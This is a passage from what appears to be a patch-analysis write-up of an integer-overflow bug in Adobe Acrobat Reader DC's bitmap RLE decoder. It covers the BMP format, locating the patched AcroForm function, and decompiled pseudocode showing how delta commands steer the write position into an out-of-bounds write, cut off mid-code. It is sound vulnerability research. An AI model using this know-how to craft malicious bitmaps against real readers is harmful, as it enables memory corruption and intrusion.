class="comment">// bits per pixel</span></span><br><span class="line">  DWORD biCompression;      <span class="comment">// compression method</span></span><br><span class="line">  DWORD biSizeImage;        <span class="comment">// size of bitmap bits</span></span><br><span class="line">  LONG  biXPelsPerMeter;    <span class="comment">// horizontal resolution, pixels-per-meter</span></span><br><span class="line">  LONG  biYPelsPerMeter;    <span class="comment">// vertical resolution, pixels-per-meter</span></span><br><span class="line">  DWORD biClrUsed;          <span class="comment">// number of color indexes in the color table</span></span><br><span class="line">  DWORD biClrImportant;     <span class="comment">// number of color indexes that are required</span></span><br><span class="line">&#125; BITMAPINFOHEADER, *PBITMAPINFOHEADER;</span><br></pre></td></tr></table></figure><p>The value of <code>biCompression</code> represents the compression method of the bitmap. Following are some of the possible values of it:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RGB  0  <span class="comment">// uncompressed format</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE8 1  <span class="comment">// run-length encoded (RLE) format with 8 bpp</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE4 2  <span class="comment">// run-length encoded (RLE) format with 4 bpp</span></span></span><br><span class="line"><span class="comment">// other compression methods...</span></span><br></pre></td></tr></table></figure><h4 id="3-1-3-RGBQUAD-Array"><a href="#3-1-3-RGBQUAD-Array" class="headerlink" title="3.1.3 RGBQUAD Array"></a>3.1.3 RGBQUAD Array</h4><p>The <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-rgbquad" target="_blank" rel="noopener">RGBQUAD</a></strong> structure describes a color consisting of relative intensities of red, green, and blue. Following is the definition of this structure:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagRGBQUAD</span> &#123;</span></span><br><span class="line">  BYTE rgbBlue;</span><br><span class="line">  BYTE rgbGreen;</span><br><span class="line">  BYTE rgbRed;</span><br><span class="line">  BYTE rgbReserved;</span><br><span class="line">&#125; RGBQUAD;</span><br></pre></td></tr></table></figure><p>The elements of the RGBQUAD array make up the color table. The number of entries in the array depends on the values of the <code>biBitCount</code> and <code>biClrUsed</code> members of the <strong>BITMAPINFOHEADER</strong> structure.</p><h4 id="3-1-4-Bitmap-Data"><a href="#3-1-4-Bitmap-Data" class="headerlink" title="3.1.4 Bitmap Data"></a>3.1.4 Bitmap Data</h4><p>Bits data of the bitmap. The layout of this section depends on the compression method of the bitmap.</p><p>One thing should be noted is that usually pixels are stored â€œbottom-upâ€, starting in the lower left corner, going from left to right, and then row by row from the bottom to the top of the image [<a href="https://en.wikipedia.org/wiki/BMP_file_format#Pixel_array_(bitmap_data" target="_blank" rel="noopener">wikipedia</a>)].</p><h3 id="3-2-Run-Length-Encoding"><a href="#3-2-Run-Length-Encoding" class="headerlink" title="3.2 Run Length Encoding"></a>3.2 Run Length Encoding</h3><p>Two types of <strong>run length encoding</strong> methods can be used in bitmap files: <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/73b57f24-6d78-4eeb-9c06-8f892d88f1ab" target="_blank" rel="noopener">RLE4</a> and <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/b64d0c0b-bb80-4b53-8382-f38f264eb685" target="_blank" rel="noopener">RLE8</a> .</p><h4 id="3-2-1-RLE8"><a href="#3-2-1-RLE8" class="headerlink" title="3.2.1 RLE8"></a>3.2.1 RLE8</h4><p>The RLE8 compression algorithm is used to compress an 8-bit bitmap. This format specifies encoded and absolute modes, and either mode can occur anywhere in a given bitmap.</p><p><strong>Encoded mode</strong> involves two bytes:</p><ul><li><p>If the first byte of a pair is greater than zero, it specifies the number of consecutive pixels to be drawn using the color index that is contained in the second byte.</p></li><li><p>If the first byte of a pair is zero and the second byte is 0x02 or less, the second byte is an escape value that can denote the end of a line, the end of the bitmap, or a relative pixel position, as follows.</p><ul><li>0x00 - End of line</li><li>0x01 - End of bitmap</li><li>0x02 - Delta</li></ul></li></ul><p>When a delta is specified, the 2 bytes following the escape value contain unsigned values indicating the horizontal and vertical offsets of the next pixel relative to the current position.</p><p>In <strong>absolute mode</strong>, the first byte is zero, and the second byte is a value in the range 0x03 through 0xFF. The second byte represents the number of bytes that follow, each of which contains the color index of a single pixel. In absolute mode, each run is aligned on a word boundary.</p><p>The following example shows the hexadecimal contents of an 8-bit compressed bitmap:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 03 45 56 67] [02 78] [00 02 05 01]</span><br><span class="line">[02 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure><p>The bitmap expands as follows (two-digit values represent a color index for a single pixel):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">04 04 04</span><br><span class="line">06 06 06 06 06</span><br><span class="line">45 56 67</span><br><span class="line">78 78</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">78 78</span><br><span class="line">end of line</span><br><span class="line">1E 1E 1E 1E 1E 1E 1E 1E 1E</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure><h4 id="3-2-2-RLE4"><a href="#3-2-2-RLE4" class="headerlink" title="3.2.2 RLE4"></a>3.2.2 RLE4</h4><p>The RLE4 compression algorithm is used to compress a 4-bit bitmap. This format specifies encoded and absolute modes, and either mode can occur anywhere in a given bitmap.</p><p><strong>Encoded mode</strong> involves two bytes. If the first byte of a pair is greater than zero, it specifies the number of consecutive pixels to be drawn using the two color indexes that are contained in the high-order and low-order bits of the second byte.</p><p>The first pixel is drawn using the color specified by the high-order 4 bits, the second is drawn using the color in the low-order 4 bits, the third is drawn using the color in the high-order 4 bits, and so on, until all the pixels specified by the first byte have been drawn.</p><p>If the first byte of a pair is zero and the second byte is 0x02 or less, the second byte is an escape value that can denote the end of a line, the end of the bitmap, or a relative pixel position, as follows.</p><ul><li>0x00 - End of line</li><li>0x01 - End of bitmap</li><li>0x02 - Delta</li></ul><p>When a delta is specified, the 2 bytes following the escape value contain unsigned values indicating the horizontal and vertical offsets of the next pixel relative to the current position.</p><p>In <strong>absolute mode</strong>, the first byte is zero, and the second byte is a value in the range 0x03 through 0xFF. The second byte contains the number of 4-bit color indexes that follow. Subsequent bytes contain color indexes in their high- and low-order 4 bits, one color index for each pixel. In absolute mode, each run is aligned on a word boundary.</p><p>The following example shows the hexadecimal contents of a 4-bit compressed bitmap:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 06 45 56 67 00] [04 78] [00 02 05 01]</span><br><span class="line">[04 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure><p>The bitmap expands as follows:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0 4 0</span><br><span class="line">0 6 0 6 0</span><br><span class="line">4 5 5 6 6 7</span><br><span class="line">7 8 7 8</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">7 8 7 8</span><br><span class="line">end of line</span><br><span class="line">1 E 1 E 1 E 1 E 1</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure><h2 id="0x04-Vulnerability-Details"><a href="#0x04-Vulnerability-Details" class="headerlink" title="0x04. Vulnerability Details"></a>0x04. Vulnerability Details</h2><h3 id="4-1-Code-Identification"><a href="#4-1-Code-Identification" class="headerlink" title="4.1 Code Identification"></a>4.1 Code Identification</h3><p>According to the advisory on ZDIâ€™s website, we know that the flaw exists within the <strong>AcroForm</strong> module. Itâ€™s the forms plug-in of Adobe Acrobat Reader DC and is responsible for parsing <a href="https://en.wikipedia.org/wiki/XFA" target="_blank" rel="noopener">XFA forms</a> . Following is the path of binary file of this plug-in:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%PROGRAMFILES(X86)%\Adobe\Acrobat Reader DC\Reader\plug_ins\AcroForm.api</span><br></pre></td></tr></table></figure><p>Generally speaking, when doing patch analysis we may want to use <a href="https://www.zynamics.com/bindiff.html" target="_blank" rel="noopener">BinDiff</a> to help identify the changed functions between the old and new versions of the binary file. But it wonâ€™t be easy to find the target one if too many functions were changed. And thatâ€™s the case of <code>AcroForm.api</code> . Here weâ€™ll use some trivial tricks to identify the related functions.</p><p>The following analysis was carried out on Adobe Acrobat Reader DC <code>2019.012.20035</code> . The same method can be applied to version <code>2019.012.20036</code> .</p><ol><li>Search string <code>PNG</code> in IDA and weâ€™ll find one at <code>.rdata:20F9A374</code> </li><li>Find cross references to <code>20F9A374</code> and weâ€™ll go to function <code>sub_20CF3A3F</code> </li><li>Obviously function <code>sub_20CF3A3F</code> is responsible for identifying the type of the image</li><li>Find cross references to <code>sub_20CF3A3F</code> and weâ€™ll go to function <code>sub_20CF4BE8</code> </li><li>Function <code>sub_20CF4BE8</code> will call corresponding image parsing functions according to image types</li><li>Function <code>sub_20CF3E5F</code> , which will be called by function <code>sub_20CF4870</code> , is responsible for parsing bitmap images</li></ol><p>The result of BinDiff shows that some basic blocks were changed in function <code>sub_20CF3E5F</code> . Letâ€™s take the basic block which begins at <code>20CF440F</code> as an example to show the difference.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F in AcroForm 2019.012.20035</span></span><br><span class="line"><span class="keyword">if</span> ( v131 &gt;= v26 || (<span class="keyword">unsigned</span> __int8)v127 + v43 &gt; v123 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F in AcroForm 2019.012.20036</span></span><br><span class="line">v56 = (<span class="keyword">unsigned</span> __int8)v130 + v43;</span><br><span class="line"><span class="keyword">if</span> ( v134 &gt;= v26 || v56 &gt; v126 || v56 &lt; v43 || v56 &lt; (<span class="keyword">unsigned</span> __int8)v130 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br></pre></td></tr></table></figure><p>Itâ€™s obvious that the code was changed to prevent integer overflow circumstances.</p><h3 id="4-2-Vulnerability-Analysis"><a href="#4-2-Vulnerability-Analysis" class="headerlink" title="4.2 Vulnerability Analysis"></a>4.2 Vulnerability Analysis</h3><p>Thanks to <a href="http://blog.binamuse.com/2013/05/readerbmprle.html" target="_blank" rel="noopener">feliamâ€™s write up for CVE-2013-2729</a> , we can quickly understand whatâ€™s going on in function <code>sub_20CF3E5F</code> .</p><h4 id="4-2-1-RLE8-Decoding"><a href="#4-2-1-RLE8-Decoding" class="headerlink" title="4.2.1 RLE8 Decoding"></a>4.2.1 RLE8 Decoding</h4><p>Following pseudo code, which was extracted from function <code>sub_20CF3E5F</code> , was responsible for parsing the RLE8 compressed data.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( bmih.biCompression == <span class="number">1</span> )  <span class="comment">// RLE8 algorithm</span></span><br><span class="line">&#123;</span><br><span class="line">  xpos = <span class="number">0</span>;                     <span class="comment">// unsigned int, from left to right</span></span><br><span class="line">  ypos = bmih.biHeight - <span class="number">1</span>;     <span class="comment">// unsigned int, from bottom to top</span></span><br><span class="line">  bitmap_ends = <span class="number">0</span>;</span><br><span class="line">  result = fn_feof(v1[<span class="number">2</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( bitmap_ends )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);           <span class="comment">// read 2 bytes</span></span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)cmd )                         <span class="comment">// first byte != 0</span></span><br><span class="line">      &#123;                                         <span class="comment">// means have compressed data</span></span><br><span class="line">        <span class="comment">// 20CF440F, this basic block was patched in the updated binary file</span></span><br><span class="line">        <span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">            line[xpos++] = BYTE1(cmd);</span><br><span class="line">            ++index;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// uncompress data</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) )        <span class="comment">// first byte = 0, second byte != 0</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">1</span> )      <span class="comment">// end of bitmap</span></span><br><span class="line">        &#123;</span><br><span class="line">          bitmap_ends = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> ) <span class="comment">// delta</span></span><br><span class="line">        &#123;</span><br><span class="line">          fn_read_bytes(v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">          fn_read_bytes(v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">          xpos += xdelta;           <span class="comment">// move to right</span></span><br><span class="line">          ypos -= ydelta;           <span class="comment">// move to up</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                        <span class="comment">// uncompressed data</span></span><br><span class="line">        &#123;</span><br><span class="line">          dst_xpos = BYTE1(cmd) + xpos;</span><br><span class="line">          <span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &lt; xpos || </span><br><span class="line">               dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  <span class="comment">// overflow check</span></span><br><span class="line">            <span class="keyword">goto</span> LABEL_170;         <span class="comment">// CxxThrowException</span></span><br><span class="line">          index = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( BYTE1(cmd) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">              line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">              line[xpos++] = value;</span><br><span class="line">              count = BYTE1(cmd);</span><br><span class="line">              ++index;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( index &lt; BYTE1(cmd) );   <span class="comment">// uncompressed data</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( count &amp; <span class="number">1</span> )                  <span class="comment">// alignment</span></span><br><span class="line">            fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                  <span class="comment">// end of line</span></span><br><span class="line">      &#123;</span><br><span class="line">        --ypos;                             <span class="comment">// move to next line</span></span><br><span class="line">        xpos = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = fn_feof(v1[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !result );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Based on previous patch analysis, itâ€™s obvious that integer overflow can be triggered in the following <code>if</code> statement.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F in AcroForm 2019.012.20036</span></span><br><span class="line">dst_xpos = (<span class="keyword">unsigned</span> __int8)cmd + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &gt; width || </span><br><span class="line">     dst_xpos &lt; xpos || dst_xpos &lt; (<span class="keyword">unsigned</span> __int8)cmd )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br></pre></td></tr></table></figure><p>The flaw exists within the arithmetic computation of <code>(unsigned __int8)cmd + xpos</code> . Here the value of both variables can be controlled by the attacker. And Out-Of-Bounds write can be triggered when decompressing RLE8 compressed data.</p><ol><li>The value of <code>(unsigned __int8)cmd</code> can be controlled directly in the bitmap file</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);           <span class="comment">// read 2 bytes</span></span><br></pre></td></tr></table></figure><ol start="2"><li>The value of <code>xpos</code> can be controlled by arranging lots of <code>delta</code> commands in <strong>encoded mode</strong></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> ) <span class="comment">// delta</span></span><br><span class="line">&#123;</span><br><span class="line">  fn_read_bytes(v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">  fn_read_bytes(v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">  xpos += xdelta;           <span class="comment">// move to right, add any value in [0, 255]</span></span><br><span class="line">  ypos -= ydelta;           <span class="comment">// move to up</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>Out-Of-Bounds write can be triggered when decompressing RLE8 compressed data</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);            <span class="comment">// OOB write with constrolled data</span></span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// uncompress data</span></span><br></pre></td></tr></table></figure><h4 id="4-2-2-RLE4-Decoding"><a href="#4-2-2-RLE4-Decoding" class="headerlink" title="4.2.2 RLE4 Decoding"></a>4.2.2 RLE4 Decoding</h4><p>Following pseudo code, which was also extracted from function <code>sub_20CF3E5F</code> , was responsible for parsing the RLE4 compressed data. The decoding process was almost the same, but itâ€™s a little more complicated than RLE8 since the data unit was not a byte.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( bmih.biCompression == <span class="number">2</span> )  <span class="comment">// RLE4 algorithm</span></span><br><span class="line">&#123;</span><br><span class="line">  xpos = <span class="number">0</span>;                     <span class="comment">// unsigned int, from left to right</span></span><br><span class="line">  ypos = bmih.biHeight - <span class="number">1</span>;     <span class="comment">// unsigned int, from bottom to top</span></span><br><span class="line">  bitmap_ends = <span class="number">0</span>;</span><br><span class="line">  odd_index_ = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !fn_feof(v1[<span class="number">2</span>]) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( bitmap_ends )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);       <span class="comment">// read 2 bytes</span></span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)cmd )                     <span class="comment">// first byte != 0</span></span><br><span class="line">      &#123;                                     <span class="comment">// means have compressed data</span></span><br><span class="line">        high_4bits = BYTE1(cmd) &gt;&gt; <span class="number">4</span>;       <span class="comment">// high-order 4 bits</span></span><br><span class="line">        low_4bits = BYTE1(cmd) &amp; <span class="number">0xF</span>;       <span class="comment">// low-order 4 bits</span></span><br><span class="line">        <span class="comment">// 20CF45F8, this basic block was patched in the updated binary file</span></span><br><span class="line">        <span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_170;                   <span class="comment">// CxxThrowException</span></span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">        &#123;</span><br><span class="line">          xpos_ = odd_index_;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            byte_slot = xpos_ &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            odd_index = index &amp; <span class="number">1</span>;</span><br><span class="line">            line = fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">            _4bits = high_4bits;            <span class="comment">// even index -&gt; high-order 4 bits</span></span><br><span class="line">            <span class="keyword">if</span> ( odd_index )                <span class="comment">// odd index -&gt; low-order 4 bits</span></span><br><span class="line">              _4bits = low_4bits;</span><br><span class="line">            <span class="keyword">if</span> ( xpos_ &amp; <span class="number">1</span> )                <span class="comment">// odd xpos, old byte</span></span><br><span class="line">            &#123;</span><br><span class="line">              line[byte_slot] |= _4bits;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>                            <span class="comment">// even xpos, new byte</span></span><br><span class="line">            &#123;</span><br><span class="line">              line[byte_slot] = <span class="number">16</span> * _4bits;</span><br><span class="line">            &#125;</span><br><span class="line">            ++xpos_;</span><br><span class="line">            index = index + <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd );</span><br><span class="line">          odd_index_ = xpos_;</span><br><span class="line">          xpos = odd_index_;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) )                <span class="comment">// first byte = 0, second byte != 0</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">1</span> )              <span class="comment">// end of bitmap</span></span><br><span class="line">        &#123;</span><br><span class="line">          bitmap_ends = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> )         <span class="comment">// delta</span></span><br><span class="line">        &#123;</span><br><span class="line">          fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">          fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">          xpos += xdelta;                   <span class="comment">// move to right</span></span><br><span class="line">          ypos -= ydelta;                   <span class="comment">// move to up</span></span><br><span class="line">          odd_index_ = xpos;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 20CF44EA, this basic block was patched in the updated binary file</span></span><br><span class="line">          <span class="keyword">if</span> ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_170;                 <span class="comment">// 